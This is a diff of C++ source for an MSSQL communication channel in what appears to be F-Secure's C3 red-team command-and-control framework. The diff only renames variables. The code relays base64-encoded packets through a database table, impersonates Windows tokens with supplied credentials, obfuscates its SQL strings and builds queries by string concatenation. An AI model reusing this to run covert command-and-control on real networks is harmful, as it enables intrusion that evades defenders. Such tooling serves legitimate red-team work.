@@ -12,20 +12,20 @@ namespace
 }
 
 FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
-	: m_inboundDirectionName{ arguments.Read<std::string>() }
-	, m_outboundDirectionName{ arguments.Read<std::string>() }
+	: m_InboundDirectionName{ arguments.Read<std::string>() }
+	, m_OutboundDirectionName{ arguments.Read<std::string>() }
 {
-	ByteReader{ arguments }.Read(m_servername, m_databasename, m_tablename, m_username, m_password, m_useSSPI);
+	ByteReader{ arguments }.Read(m_ServerName, m_DatabaseName, m_TableName, m_Username, m_Password, m_UseSSPI);
 
 	//create a new impersonation token and inject it into the current thread.
-	if (m_useSSPI && !this->m_username.empty())
+	if (m_UseSSPI && !this->m_Username.empty())
 	{
 		std::string user, domain;
 		HANDLE hToken;
-		user = this->m_username.substr(this->m_username.find("\\") + 1, this->m_username.size());
-		domain = this->m_username.substr(0, this->m_username.find("\\"));
+		user = this->m_Username.substr(this->m_Username.find("\\") + 1, this->m_Username.size());
+		domain = this->m_Username.substr(0, this->m_Username.find("\\"));
 
-		if (!LogonUserA(user.c_str(), domain.c_str(), this->m_password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken))
+		if (!LogonUserA(user.c_str(), domain.c_str(), this->m_Password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken))
 			throw std::runtime_error("[x] error creating Token");
 		auto userToken = WinTools::UniqueHandle(hToken);
 
@@ -33,21 +33,21 @@ FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
 		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &impersonationToken))
 			throw std::runtime_error("[x] error duplicating token");
 
-		m_impersonationToken = WinTools::UniqueHandle(impersonationToken);
+		m_ImpersonationToken = WinTools::UniqueHandle(impersonationToken);
 	}
 
 	Sql::Enviroment env;
-	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken.get());
+	auto conn = env.Connect(m_ServerName, m_DatabaseName, m_Username, m_Password, m_UseSSPI, m_ImpersonationToken.get());
 
 	//Initial SQL Query is to identify if m_tablename exists
-	std::string stmtString = OBF("Select * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '") + m_tablename + OBF("';");
+	std::string stmtString = OBF("Select * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '") + m_TableName + OBF("';");
 	auto hStmt = conn.MakeStatement(stmtString);
 	hStmt.Execute();
 
 	//if there are no rows then the table doesn't exist - so create it
 	if (hStmt.Fetch() != SQL_SUCCESS)
 	{
-		stmtString = OBF("CREATE TABLE dbo.") + this->m_tablename + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSGID varchar(250), MSG varchar(max));");
+		stmtString = OBF("CREATE TABLE dbo.") + this->m_TableName + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSGID varchar(250), MSG varchar(max));");
 		auto createStatement = conn.MakeStatement(stmtString);
 		createStatement.Execute();
 	}
@@ -57,12 +57,12 @@ size_t FSecure::C3::Interfaces::Channels::MSSQL::OnSendToChannel(FSecure::ByteVi
 {
 	//connect to the database
 	Sql::Enviroment env;
-	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken.get());
+	auto conn = env.Connect(m_ServerName, m_DatabaseName, m_Username, m_Password, m_UseSSPI, m_ImpersonationToken.get());
 
 	//Rounded down: Max size of bytes that can be put into a MSSQL database before base64 encoding
 	packet = packet.SubString(0, MAX_MSG_BYTES);
 
-	std::string stmtString = OBF("INSERT into dbo.") + this->m_tablename + OBF(" (MSGID, MSG) VALUES ('") + this->m_outboundDirectionName + "', '" + cppcodec::base64_rfc4648::encode(packet) + OBF("');");
+	std::string stmtString = OBF("INSERT into dbo.") + this->m_TableName + OBF(" (MSGID, MSG) VALUES ('") + this->m_OutboundDirectionName + "', '" + cppcodec::base64_rfc4648::encode(packet) + OBF("');");
 	auto hStmt = conn.MakeStatement(stmtString);
 	hStmt.Execute();
 
@@ -74,9 +74,9 @@ std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnRec
 {
 	//connect to the database
 	Sql::Enviroment env;
-	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken.get());
+	auto conn = env.Connect(m_ServerName, m_DatabaseName, m_Username, m_Password, m_UseSSPI, m_ImpersonationToken.get());
 
-	const auto stmt = OBF("SELECT TOP 100 * FROM dbo.") + this->m_tablename + OBF(" WHERE MSGID = '") + this->m_inboundDirectionName + OBF("';");
+	const auto stmt = OBF("SELECT TOP 100 * FROM dbo.") + this->m_TableName + OBF(" WHERE MSGID = '") + this->m_InboundDirectionName + OBF("';");
 	auto hStmt = conn.MakeStatement(stmt);
 	hStmt.Execute();
 
@@ -106,7 +106,7 @@ std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnRec
 		//Remove the trailing "," from the idList
 		idList.pop_back();
 
-		const auto stmt = OBF("DELETE FROM dbo.") + this->m_tablename + OBF(" WHERE ID IN (") + idList + OBF(");");;
+		const auto stmt = OBF("DELETE FROM dbo.") + this->m_TableName + OBF(" WHERE ID IN (") + idList + OBF(");");;
 		auto deleteStmt = conn.MakeStatement(stmt);
 		//Delete all of the rows we have just read
 		deleteStmt.Execute();
@@ -131,17 +131,17 @@ FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::OnRunCommand(ByteV
 FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::ClearTable()
 {
 	Sql::Enviroment env;
-	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken.get());
+	auto conn = env.Connect(m_ServerName, m_DatabaseName, m_Username, m_Password, m_UseSSPI, m_ImpersonationToken.get());
 
 	{
-		const auto deleteStmt = OBF("DELETE FROM dbo.") + this->m_tablename + ";";
+		const auto deleteStmt = OBF("DELETE FROM dbo.") + this->m_TableName + ";";
 		auto hStmt = conn.MakeStatement(deleteStmt);
 		hStmt.Execute();
 	}
 
 	{
 		//reset the ID to 0
-		const auto resetStmt = OBF("DBCC CHECKIDENT('dbo.") + this->m_tablename + OBF("', RESEED, 0)");
+		const auto resetStmt = OBF("DBCC CHECKIDENT('dbo.") + this->m_TableName + OBF("', RESEED, 0)");
 		auto hStmt = conn.MakeStatement(resetStmt);
 		hStmt.Execute();
 	}
